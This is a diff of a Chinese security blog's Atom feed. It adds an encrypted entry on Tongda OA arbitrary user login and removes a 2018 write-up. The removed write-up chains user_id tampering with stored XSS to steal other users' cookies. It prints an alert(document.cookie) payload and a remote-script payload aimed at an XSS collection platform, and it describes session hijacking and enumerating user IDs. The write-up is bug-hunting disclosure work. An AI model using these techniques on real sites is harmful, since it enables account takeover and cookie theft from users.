@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://c1aysec.github.io/"/>
-  <updated>2020-03-31T04:40:21.579Z</updated>
+  <updated>2020-04-22T09:33:21.896Z</updated>
   <id>https://c1aysec.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>通达OA任意用户登录</title>
+    <link href="https://c1aysec.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
+    <id>https://c1aysec.github.io/2020/04/22/通达OA任意用户登录/</id>
+    <published>2020-04-22T08:46:58.116Z</published>
+    <updated>2020-04-22T09:33:21.896Z</updated>
+    
+    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="Hey, password is required here." />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8e4a1ba7e80bfbb14702fae694080a6f752b8d2170adefdca5178dee70bf6259">a3a65474d6062f3d87e92565f4e5409879f38064a746abe6bd5fa7c98dc0299a812161f8a9bc230d778eb314054dbd5823136cca02ddfe2ff873df1d219a7e3ae53ea7cd4d59263547a884f9e9a477009dc5e835f557dc06b3002eb49f867a6f0db5c042cfba47f27bc3fd9da9e385dd9811dd74397e66479747ecb5381b42973779dc8c843e613b8d9aa977d9b6ffb3831ffeb70101a39f9284e577a8a55f15ef90d0bc010289f12d5cba7dc9d9f003cc23ec2c2967c3db887357a2c14886a6f53c25a5d4911f2ca9560c11f23ccef064ed3f23314ff1d44fac25db7055c59f513afeefd6b9457db1bed7dbc46cf676bdd334da5b9b24f9e598f20fcd3ea898d8609ac8be5d513a2b07313de4ab56a26e3a3a2b317fede0b436638b29c22c17f6ee15afd1e9362833b059bb6ec8b6100302c5fbc5221940c3d5c3f1ae98cbe47c179e734675d97cd73492e7b5732f4403f297f2be89e0a8899062b8e30040940fead724aa7cfede7d734552973312dc5d469d07cb3aaae06e6834e856d5069c2dde202af5d4294e676bd1bfd7ddd5e8e04261845b5e06b1cc56252e99630a54a411324032b8569807ed314f32e20e70965055e985f35d93c5202b632fc68ffa67d0e4ba956b5ef7ce6618b167f32fb69744fb2cce953a6bf2ee63dc9e5132076217f65e47b2db2900e28d63d35d0d9c72c536d94cffca98020da02315c0fe213df3d29e8458e4974753c9da3c63539dd76de2254f9acf99ccc055a666d4fcb2553e2811e186479abbe01cca7dee4dabfddb2aea80a247834730a968e4d9a64fc8dd84f9dccbfbedc660469b9cc25c2960731c481cc2372320268d84a73689c9ddaf39acac300952e18ef998fa5a8f74edcc9e5dfd07e36bb94576974cb9761655a5627f76061c509bb3c85ce383e38e1dd9b80efb65657cd1bd004641dcc095ded0d3c4bc0e6b1d32dd179e29f24a96260b21feea004a3d05c8163d143f2b987871290c3793a324c58c895df4fd0ad88d2185ac8ba76f18dfb2eb9f8faf702eb41010f5ce8a7a975cd42ea1f72878465b40614d1d30e33c1c455bdab21b83f91f907fd4ae15b5f2391ded0bc134a527e796018af46bce2bb5a9213950f7db5dbf8e6763c771e28c4fbace5887228cdd8c0cc72311945f07f11e359e7e2185da43a33d6ce972f367590684c28fcbbc27ee320b14c146c4a5fe053b61d55545f32d2c6060114d5ca16c278ffa03efd2103d124358f424195a19b2727a3cf79ef0520a24a5dedd6e6a3a6558775b836e82eab63c3159e0cc8f66a2e60d025d7c5c5898e8ff3af22cbf058c71af8d8e50974f115236427845eb73929a1a31f97ae3e10565a473f63f9161fba7570ef863a7486de56d38869a018a77ae0ff5419e7f60323a499f01661097089a5a9f9a3df23825db0124a45cfb42082bb7b592ceb3997f6179aedf3a0021c01859ee426bcbf377a1b9abd3f981b125ce83eb2aa9366873edc99923e7da1134718b64df5805b6c9c7becb15b5c5f7f2e654645e1089bbdc890576291527c76a6a4e881c3535ab2a8f6eafd715091621444a387c21ae9e66b7ffa759561b18e6fc2768946317b8e3277a26d840703085f52828b0ee361d7e22c3f70fbc7692536e617826e32a7d8b3312780be20836c253b79d99c18ad9116c924888efe502a9e0b9955e182546cb9073a8385ec0c30115101eb86680a9c3a757b8da47060d3b8e792ebd381e8d9cc3933ced931afef6f445196e71a9297e6e2833d751dd00d940b319956957e488be4223ea9ed5b9424260b49cd95820154c5f987d74bb2ee6415b608a200af175eab21661b0cac1f3be61284a7d36fe25cb77b0569cc710b37e3975642a4ff6e1be432ae6be5d6b1b02e6c06e45f5e2414af969d14e6f4252102fad39d32b58629b15284f390d4e7a9441fddc9caff6205b54826f657a9260db1f5d9ec4cc1ecf4e189165f1ddc6e54def763c215b533702704a7f4a96f6561a9379e97c52aed4d5aa1ef8e0bd1928053b3524ecc68ae944675abfdf98dbf102ac9d583d2d373741aed49b4e0a0ccc06ec4ba117f4e9236d1f214130fe5fac78eb182d9682785549b29b9b13d4a559dc1b2b8b2a0fc69bed5fe3dc60557649b3931ec3ab4d3c0b0f1a39dfdf4a4d6456a236d0139e89d4e349d27ead07f3cd92d9fc878b2ff8a06b72d8ca9fbc7a58bf6be715aca6cda9f14107d05d6680305520520ddce94545f512b07d6fff73806ebdbab7bf5bae0fb3fba92b55465ee57cbeb1dc0b990d7016668682b2f1c1dd31a34ed885a8a8c1d77581917d341de6ee91d2bd65790d1666fd5de8f57aeec00541c43975d720c3a73456c9cd4ead560a85ce9a5a881a447767ab4e2cb0ab8c33e95f85ba6bbf438a4cd740035cab90d2b608aecd885a1e67fc075c7b3c2cf0178b61ae989b05feaef526b12be087ebbefcbbe2ee26230d2ecbe70dc44cbbfea871ea20b891d072a6d0c77f52d607fec2b28a8e847e52898955ea402caec776c222b95f2bec8f2e9f3f28de55d7e00765b39b51191545673b088b65d319fb3a67d29edc4e86dcf2600de4ef446019edf648e48d66b701e538711ef2f7acb40012a7d72b8a7eba4621b1a208008e627104913bd8c9a810eda38adb44e44eeb90a3c2e10458f4e16c9f285c75074e900c2d32bd440556d3dab29a8b4e0b655d822e77efdaa86ab63832b5fc11dabf571dd2471fb2f594ac110d26e81ec920bb8fbff8e55df55dbff3457fc34ed17d69d5cdf59bcf6a4abb36d49f4ca11af70c3ee5596c368bd0d91c169ce5605cfb67705846f4d78566a6f7dbbddc082c32e4900fc3df82cda2f1d74459794fab7e711d90e2bb903c2860f4f8687fc4b40fc0409e54e7ea298ec3d7b92bc87051805a58c6337a057f0e0b3761c2230435acc8fd58a888cbffe016377bedc878bce7d84d3204b239b73d978034d7047599335a8f1b853214f5b32e965a6ab51342ec22ac5f7c78f5ab9f0b7fb8662616eda366a0a7c5d17ae7181e416e3ccf1de418724d3a221785bd44968adf92435d7a5975b584efb0476538277b2e119348a7e10b1e093a41f9ca37dd6bbf64d4a4ce9e3e37bf023d57b04328f6d65bfed69004262500196dd350609decbf166a08da1cdbe9e0c70d5671158411f4cbf7b0ed8a0ee91c3f8488bf0d5137decbde37b741d4dbba3c01ba723dc8c2b25b1081b872dbb9a4ab058cc64336aa18b7fa1fe9311b46b1577d6606ef579b6f0b112d60c69c7ba0a39445b4b239ca9f7e19c37785c982c8c1c24899a143a0e2498fc20c4f0b599b5a58ad6b03855e5a46f9f5214cb40925300956ef30811d3c43b9a5329c71f0eb8dae0763da341b1c84a3ad74af2e0d93e7720da1a373f9282bea728b905a96e0b4af8622510dcd9eb698ceccc2e8f8fece7b00efe5ee332c93e9674655894ffc39e9d750032d81612c1d1a66bbc67e4c42c0a35690a08525e83849ae64a625ddcb3cb831b89118f23784e7ddc03ef23df083e63ff936b0e4dc42560d6bf378e3caa1e1eed888bc9a9045efc5d63add4063bd0ae04b775d498ec815920e17745844f1b70c4df981508df8ab42121b6dd7a7e8d087c01863744fe809774d8cb1c1b3381512755dfac48f02abb362953f26e74c641b063cc76074b6402caa4357acf67d2326f9f5f60542afb3966ced9f25c49e25209989adae44cf1fe1ef4ac19ea505ace0774b0e2666c6fed0e76e79f727382d746e77ff0ae06be3534cdf157c23de99481258d2fff3cae7a7675f2ff2ac0de7aefaa48198ba8e190aee0884db1d1e7593e905bdd2435b8ba31b3b13ffce3f43fbac2d5b29f5e2494489ea72d440f1463f694985558ed937252c4b49000efe14b7468f8015a80b7935566a53ac5b4a87ffb4216f815562745f3903356629263dd9e15026552f04c59066b7e8173d4ae22e063b8975de2687848794da2132d963d1e61619ebe135e7173c7080ce1914cfccf07c496eb738ebc3ab61c22796358935815ebde9f09a8003821fe21e511be281e493f87a2face178086fd19cdbc4e1298b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    
+    <summary type="html">
+    
+      Here&#39;s something encrypted, password is required to continue reading.
+    
+    </summary>
+    
+      <category term="漏洞分析" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="漏洞分析" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
   
   <entry>
     <title>暴力破解-百度api识别图形验证码学习记录</title>
@@ -462,31 +484,6 @@
     
     
       <category term="Linux" scheme="https://c1aysec.github.io/tags/Linux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>记一次漏洞组合拳-水平越权+Self XSS漏洞</title>
-    <link href="https://c1aysec.github.io/2018/08/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E6%8B%B3-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83+Self%20XSS%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://c1aysec.github.io/2018/08/08/记一次漏洞组合拳-水平越权+Self XSS漏洞/</id>
-    <published>2018-08-07T16:26:51.000Z</published>
-    <updated>2019-11-08T14:23:47.286Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="记一次漏洞组合拳-水平越权-Self-XSS漏洞"><a href="#记一次漏洞组合拳-水平越权-Self-XSS漏洞" class="headerlink" title="记一次漏洞组合拳-水平越权+Self XSS漏洞"></a>记一次漏洞组合拳-水平越权+Self XSS漏洞</h1><p><strong>在一次漏洞挖掘当中，发现在用户中心设置信息的位置存在存储型xss漏洞，尝试新增常用联系人，在详细地址的位置插入xss的payload，可以发现成功弹出了Cookie</strong></p><p><img src="http://pic.c1imber.top/blog/180808/2h2EHIHFCF.png?imageslim" alt="mark"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180808/8mLLkI6508.png?imageslim" alt="mark"></p><p><strong>但是此处有可能只是一个selfxss，如果只是能打到自己的cookie，那么这个存储型xss就会显得很鸡肋。但是这个网站存在一个越权添加个人信息的漏洞，越权的漏洞之前也提交过一次，在添加的时候通过修改user_id可以越权将信息添加到其它用户里，在这里可以利用越权漏洞将xsspayload插入其他用户的个人中心里去扩大这个selfxss的危害,简单来说就是利用越权添加和selfxss的组合拳增加这个selfxss的危害，这样就可以打到其他用户的cookie</strong></p><p><strong>还是之前测试越权的两个账号</strong></p><pre><code>用户A（格鲁特）   id：112054用户B（火箭）   id：112069</code></pre><p><strong>首先在A的个人中心中添加常用联系人，之前说了在详细地址处存在存储型xss，这里插入加载远程js的xsspayload，同时使用xss平台接收信息</strong></p><p><strong>xsspayload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=xss平台上的远程脚本&gt;&lt;/script&gt;</div></pre></td></tr></table></figure><p><strong>之后抓包，数据包里有个参数为user_id，这个参数可控，导致可以越权</strong><br><img src="http://pic.c1imber.top/blog/180808/8DCH9k5D1l.png?imageslim" alt="mark"></p><p><strong>修改数据包中的user_id,尝试将此条包含xsspayload的信息越权添加到其他用户的个人信息中，如果成功，那么其他用户在登陆后查看时就会触发xss代码加载远程脚本，将用户的cookie打到我们的xss平台上，这里将user_id改为用户B的id（112069）</strong></p><p><img src="http://pic.c1imber.top/blog/180808/7A8I50Gb0d.png?imageslim" alt="mark"></p><p><strong>可以看到添加成功，但是在当前的账号上看不到刚刚添加的信息</strong></p><p><strong>然后使用用户B登陆，可以看到包含xsspayload的信息是否已经被越权添加到用户B的常用信息中,可以看到用户B在登陆后查看联系人信息时我们的xss平台就能接收到该用户的cookie</strong><br><img src="http://pic.c1imber.top/blog/180808/6D023iAEL1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180808/EcL0eeimml.png?imageslim" alt="mark"></p><p><strong>接下来将获取到的用户B的cookie替换为用户A的cookie，可以看到成功登陆到了用户B的账号</strong><br><img src="http://pic.c1imber.top/blog/180808/EB6Lga9LI4.png?imageslim" alt="mark"></p><p><strong>而且user_id只有6位数，是可以遍历的，如果遍历了所有的uid，那么就可以打到所有用户的cookie，所以漏洞的危害还是非常大的，所以通过selfxss+水平越权两个低危漏洞组合就可以变成一个影响严重的高危漏洞</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这是我在漏洞挖掘中遇到的一个比较有意思的组合利用，在漏洞挖掘中，遇到低危漏洞时，不要急着提交，先看看有没有可以扩大其危害的漏洞，可以尝试组合利用一下，会有意想不到的惊喜</strong></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;记一次漏洞组合拳-水平越权-Self-XSS漏洞&quot;&gt;&lt;a href=&quot;#记一次漏洞组合拳-水平越权-Self-XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;记一次漏洞组合拳-水平越权+Self XSS漏洞&quot;&gt;&lt;/a&gt;记一次漏洞组合拳-水平越权+
-      
-    
-    </summary>
-    
-      <category term="漏洞挖掘" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
-    
-    
-      <category term="漏洞挖掘" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
     
   </entry>
   
